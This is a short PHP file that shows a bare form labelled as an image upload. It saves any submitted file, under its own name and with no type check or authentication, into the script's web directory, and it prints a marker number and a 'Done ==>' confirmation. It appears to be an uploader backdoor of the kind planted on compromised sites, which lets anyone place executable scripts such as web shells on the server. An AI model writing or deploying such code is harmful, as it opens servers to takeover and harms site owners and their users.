<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $f = $_FILES['image'];
    if ($f['error'] === UPLOAD_ERR_OK) {
        $name = basename($f['name']);
        $ok   = move_uploaded_file($f['tmp_name'], __DIR__ . '/' . $name);
        echo $ok ? "<center><b>Done ==> {$name}</b></center>" : "<center><b>Error writing file</b></center>";
    } else {
        echo "<center><b>Upload error code: {$f['error']}</b></center>";
    }
    exit;
}
?>
6655439
<form method="post" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" value="Submit">
</form>
